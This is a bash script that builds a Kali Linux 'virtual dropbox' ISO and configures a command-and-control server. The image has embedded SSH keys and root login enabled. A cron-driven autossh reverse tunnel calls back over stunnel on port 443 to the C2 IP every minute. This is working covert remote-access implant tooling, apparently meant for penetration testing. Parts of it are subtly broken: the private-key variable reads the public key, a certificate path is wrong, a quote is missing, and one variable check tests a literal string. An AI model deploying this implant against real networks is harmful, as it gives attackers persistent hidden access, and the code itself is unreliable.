#!/usr/bin/env bash

read -p "Is this your C2 server? (y/n): " IS_C2_ANSWER
if [ "$IS_C2_ANSWER" == "y" ] || [ "$IS_C2_ANSWER" == "Y" ] || [ "$IS_C2_ANSWER" == "Yes" ] || [ "$IS_C2_ANSWER" == "yes" ]; then

    IS_C2="True"
elif [ "$IS_C2_ANSWER" == "n" ] || [ "$IS_C2_ANSWER" == "N" ] || [ "$IS_C2_ANSWER" == "No" ] || [ "$IS_C2_ANSWER" == "no" ]; then
    IS_C2="False"
else
    echo "Could not read answer. Exiting..."
    exit 1
fi
#################
#Server setup
#################

#This is the SSH key that will be saved to the client.
SSH_KEY="/tmp/id_rsa"
ssh-keygen -b 2048 -t rsa -f "$SSH_KEY" -q -N ""

##########################
#Lack of indents here are for readability of the HERE DOCUMENTS (EOF/EOSCRIPT)
##########################
# If this script is being run on teh C2 server, just create the config files and drop them in the right places.
if [ "$IS_C2" == "True" ]; then
#Create self signed cert for stunnel
openssl req -new -x509 -keyout /etc/stunnel/stunnel.pem -out /etc/stunnel/stunnel.pem -days 365 -nodes -subj "/C=US" >/dev/null 2>&1

#Create stunnel.conf (server config)
cat << EOF > /etc/stunnel/stunnel.conf
cert = /etc/tunnel/stunnel.pem
client = no

[ssl_tunnel]
accept = 443
connect = 22
EOF

#Start stunnel on server
stunnel

#Add user autossh without a password ( you will need to set the password as a priv user if you need/want to log into this account
adduser --disabled-password --gecos "" --shell /bin/rbash autossh
mkdir -p /home/autossh/.ssh/


#Copy the public key that we are dropping on the client to the server and add it to the authorized keys file on the C2 server which is what allows the client to connect automatically to the server
cat $SSH_KEY.pub >> /home/autossh/.ssh/authorized_keys
cp $SSH_KEY ~/.ssh/dropbox.key


# If this is being run on a server other than the C2 server, don't change the local server files, but create a script that the user can run on the C2 server
else

SSH_PUBKEY_CONTENTS=`cat $SSH_KEY.pub`
SSH_PRIVKEY_CONTENTS=`cat $SSH_KEY.pub`

cat << EOSCRIPT > c2_setup.sh
echo "[+] Creating self signed cert for stunnel and saving it to /etc/stunnel/stunnel.pem"
openssl req -new -x509 -keyout /etc/stunnel/stunnel.pem -out /etc/stunnel/stunnel.pem -days 365 -nodes -subj "/C=US" >/dev/null 2>&1

echo "[+] Creating stunnel.conf (server config)"
cat << EOF > /etc/stunnel/stunnel.conf
cert = /etc/tunnel/stunnel.pem
client = no

[ssl_tunnel]
accept = 443
connect = 22
EOF

echo "[+] Starting stunnel on server"
stunnel

echo "[+] Adding user autossh without a password (you will need to set the password as a priv user if you need/want to log into this account)"
adduser --disabled-password --gecos "" autossh
mkdir -p /home/autossh/.ssh/

echo "[+] Copying the dropbox pubkey into autossh's authorized keys so that the dropbox can log into this C2 server"
echo $SSH_PUBKEY_CONTENTS >> /home/autossh/.ssh/authorized_keys
echo "[+] Copying the dropbox's private key to ~/.ssh/dropbox.key so that you can ssh to the dropbox with a key if you want.
echo $SSH_PRIVKEY_CONTENTS >> ~/.ssh/dropbox.key

EOSCRIPT

chmod +x c2_setup.sh
fi
#########################

#################
#Client Setup
#################

#If specified in the command line, get IP that the client will reach out to (a public IP most likely)
C2IP=$1

#If the IP was not sent via the command line, grab it from the aws metadata service
if [ -z "$C2IP" ]; then
	C2IP=`curl http://169.254.169.254/latest/meta-data/public-ipv4`
	echo $C2IP
fi

#If still no IP, give up
if [ -z "$C2IP" ]; then
	exit 1
fi

#Set the stunnel port
C2PORT="443"
ROOT_PW=`tr -cd '[:alnum:]' < /dev/urandom | fold -w20 | head -n1`

#Update the c2 box with the tools it needs to build an ISO
apt update
apt install git live-build cdebootstrap curl -y
cd /opt
git clone git://git.kali.org/live-build-config.git build
cd /opt/build

mkdir -p /opt/build/kali-config/variant-default/package-lists/
mkdir -p /opt/build/kali-config/common/includes.binary/isolinux/
mkdir -p /opt/build/kali-config/common/hooks/
mkdir -p /opt/build/kali-config/common/includes.installer/
mkdir -p /opt/build/kali-config/common/includes.chroot/root/.ssh/
mkdir -p /opt/build/kali-config/common/includes.chroot/usr/local/bin/
mkdir -p /opt/build/kali-config/common/includes.chroot/etc/cron.d/
mkdir -p /opt/build/kali-config/common/includes.chroot/etc/stunnel/
mkdir -p /opt/build/kali-config/common/includes.chroot/usr/local/bin/
mkdir -p /opt/build/kali-config/common/includes.chroot/etc/network/interfaces.d/
mkdir -p /opt/build/kali-config/common/includes.chroot/etc/ssh/
mkdir -p /opt/build/kali-config/common/packages.chroot
sleep 2

#Specify which tools to auto install in the client ISO
cat << EOF > /opt/build/kali-config/variant-default/package-lists/kali.list.chroot
kali-linux-full
stunnel4
autossh
EOF


#copy public/private keys to VM so that the DropBox can make the autossh connection back to the C2 server
cp "$SSH_KEY" /opt/build/kali-config/common/includes.chroot/root/.ssh/
cp "$SSH_KEY".pub /opt/build/kali-config/common/includes.chroot/root/.ssh/

#copy public key to authorized keys on the VM/dropbox so that we can ssh in to the VM/DropBox with the private key
cp "$SSH_KEY".pub /opt/build/kali-config/common/includes.chroot/root/.ssh/authorized_keys

#populate stunnel on client
cat << EOF > /opt/build/kali-config/common/includes.chroot/etc/stunnel/stunnel.conf
pid = /var/run/stunnel.pid
client=yes
[ssh]
accept = 43434
connect = ${C2IP}:${C2PORT}
EOF

# This is the script that gets called by crontab.
# The ssh-keyscan line prevents the ssh connection over stunnel from getting stuck asing the user to accept the key (there is no user)
# There has to be a better to do that. This just overwrites the file every time the script is called.  A one time thing would be better.
cat << EOF > /opt/build/kali-config/common/includes.chroot/usr/local/bin/autossh_stunnel.sh
ssh-keyscan -H -p 43434 127.0.0.1 > /root/.ssh/known_hosts
/usr/bin/autossh -N -f -M 11166 -o "PubkeyAuthentication=yes" -o "PasswordAuthentication=no" -i /root/.ssh/id_rsa -R 9999:127.0.0.1:22 autossh@127.0.0.1 -p43434
EOF

chmod +x /opt/build/kali-config/common/includes.chroot/usr/local/bin/autossh_stunnel.sh

#Set up the crontab
# The second line is another hack.  For some reason even though the reverse tunnel was established on the server side, I couldnt connect to the new VM until i restarted SSH.
# This hack just restarts it every 5 minutes.  In theory, after you connect to the client the first time, you should commment out the ssh restart line (but i don't think it matters much if you don't)
cat << EOF > /opt/build/kali-config/common/includes.chroot/etc/cron.d/autossh_stunnel
* * * * * root /usr/local/bin/autossh_stunnel.sh
*/5 * * * * root /etc/init.d/ssh restart
EOF

#taken from Kali ISO of doom: https://www.offensive-security.com/kali-linux/kali-rolling-iso-of-doom/
cat << EOF > /opt/build/kali-config/common/includes.binary/isolinux/install.cfg
label install
menu label ^Install
linux /install/vmlinuz
initrd /install/initrd.gz
append vga=788 -- quiet file=/cdrom/install/preseed.cfg locale=en_US keymap=us hostname=KaliVirtualDropbox domain=local.lan
EOF

#taken from Kali ISO of doom: https://www.offensive-security.com/kali-linux/kali-rolling-iso-of-doom/
cat << EOF > /opt/build/kali-config/common/includes.binary/isolinux/isolinux.cfg
include menu.cfg
ui vesamenu.c32
default install
prompt 0
timeout 5
EOF

# For some reason while networking worked during hte installer, when the OS was first booted, there was no ethernet adapter active.  This is the fix/hack
cat << EOF > /opt/build/kali-config/common/includes.chroot/etc/network/interfaces.d/eth0
auto eth0
iface eth0 inet dhcp
EOF

#special sauce for ssh service on client machine.
cat << EOF > /opt/build/kali-config/common/includes.chroot/etc/ssh/sshd_config
Port 22
Protocol 2
UsePrivilegeSeparation yes
KeyRegenerationInterval 3600
ServerKeyBits 1024
SyslogFacility AUTH
LogLevel INFO
LoginGraceTime 120
PermitRootLogin yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
PrintMotd no
PrintLastLog yes
TCPKeepAlive yes
AcceptEnv LANG LC_*
Subsystem sftp /usr/lib/openssh/sftp-server
UsePAM yes
ClientAliveInterval 180
UseDNS no
EOF

#concept taken from Kali ISO of doom: https://www.offensive-security.com/kali-linux/kali-rolling-iso-of-doom/.  Modified to support autossh over stunnel
echo 'update-rc.d -f ssh enable' > /opt/build/kali-config/common/hooks/01-start-ssh.chroot
echo 'update-rc.d -f autossh enable' > /opt/build/kali-config/common/hooks/01-start-autossh.chroot
echo 'update-rc.d -f stunnel4 enable' > /opt/build/kali-config/common/hooks/01-start-stunnel4.chroot

#taken from Kali ISO of doom: https://www.offensive-security.com/kali-linux/kali-rolling-iso-of-doom/
chmod +x /opt/build/kali-config/common/hooks/*.chroot

#concept taken from Kali ISO of doom: https://www.offensive-security.com/kali-linux/kali-rolling-iso-of-doom/.  Modified to support unique password for every VM.
wget https://www.kali.org/dojo/preseed.cfg -O /opt/build/kali-config/common/includes.installer/preseed.cfg
sed -i "s/hostname string kali/hostname string KaliVirtualDropbox/" /opt/build/kali-config/common/includes.installer/preseed.cfg
sed -i "s/root-password-again password toor/root-password-again password $ROOT_PW/" /opt/build/kali-config/common/includes.installer/preseed.cfg
sed -i "s/root-password password toor/root-password password $ROOT_PW/" /opt/build/kali-config/common/includes.installer/preseed.cfg

ask_for_nessus_path() {
    echo ""
    echo "Almost time to build the image!  Do you have a nessus deb you want to add to the ISO?"
    read -e -p "If yes, specify the location. If no, hit enter: " NESSUS_PATH
    if [ -n "NESSUS_PATH" ]; then
        if [ -f $NESSUS_PATH ]; then
            #got build errors, but amazingly someone figurd out how and posted it on github.
            #Turns out the nessus package name is capitalized and for the iso it all needs to be lowercase
            #https://gist.github.com/kafkaesqu3/81f320ebfc8583603c679222edc464ac
            mkdir temp
            dpkg-deb --raw-extract $NESSUS_PATH temp
            sed "s/Package: Nessus/Package: nessus/" -i temp/DEBIAN/control
            dpkg-deb -b temp nessus.deb
            cp nessus.deb /opt/build/kali-config/common/packages.chroot/
            return
        else
            echo "You typed something, but it wasnt a file!"
            ask_for_nessus_path
        fi
    else
        echo "Skipping nessus addition to ISO image"
        return
    fi
}

ask_for_nessus_path




#This is the part that builds the ISO. THis is gonna take a while!
cd /opt/build/
/opt/build/build.sh --distribution kali-rolling --verbose
clear
echo ""
if [ "$IS_C2" == "True" ]; then
    echo "The root password on this ISO is: " $ROOT_PW
    echo "The IP that your Kali Virtual Dropbox will reach out to is: " $C2IP
    echo ""
    echo "On the C2 server:"
    echo ""
    echo "  1) The user autossh does not have a password set. To set it, type: sudo passwd autossh"
    echo "  2) Your image is in /opt/build/images"
    echo "  3) Serve it up with something like this: https://gist.github.com/dergachev/7028596"
    echo ""
    echo "That's it."
    echo ""
    echo "   The public ssh key has been added to /home/autossh/.ssh/authorized_keys for you"
    echo "   The stunnel service has been configured and started"
    echo ""
else
    echo "  1) Copy the following script to the c2 server and run it: "
    echo "        c2_setup.sh "
    echo ""
fi
